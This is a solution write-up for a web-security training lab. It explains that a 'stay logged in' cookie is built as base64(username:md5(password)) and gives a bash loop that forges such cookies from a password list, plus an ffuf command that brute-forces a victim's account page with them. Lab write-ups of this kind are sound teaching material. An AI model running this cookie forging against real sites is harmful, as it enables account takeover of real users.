This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


------------

## Solution 


The “stay logged in” cookie uses the format `base64(username:md5(password))`. You can confirm this by logging in as wiener with “Stay logged in” checked, grabbing the cookie, and base64 decoding it — you’ll see `wiener:md5hash`.

To attack carlos, generate a wordlist of cookies using each candidate password: MD5 hash the password, prepend `carlos:`, then base64 encode the whole thing. Send each one as the `stay-logged-in` cookie in a GET request to `/my-account`. The correct cookie returns a 200 (account page loads), wrong ones redirect to login (302).

![](../../images/Pasted%20image%2020261021202950.png)

```
while read pass; do echo -n "carlos:$(echo -n "$pass" | md5sum | cut -d' ' -f1)" | base64; done < passwords.txt > cookies.txt
```

```
ffuf -w cookies.txt -u https://TARGET/my-account -b "stay-logged-in=FUZZ" -mc 200
```


The vulnerability exists because the cookie is built from predictable, reversible components with no server-side secret or random token involved. Anyone who knows the format can forge a valid cookie for any user if they can guess or crack the password hash.